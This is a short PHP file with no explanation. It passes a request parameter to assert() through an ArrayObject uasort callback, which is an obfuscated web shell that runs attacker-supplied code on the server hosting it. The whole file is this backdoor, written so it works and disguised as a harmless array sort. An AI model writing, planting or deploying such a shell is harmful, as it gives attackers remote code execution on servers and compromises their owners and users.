<?php
   $arr = new ArrayObject(array('test', $_REQUEST['x']));
   $arr->uasort('assert');
   
   exit;
?>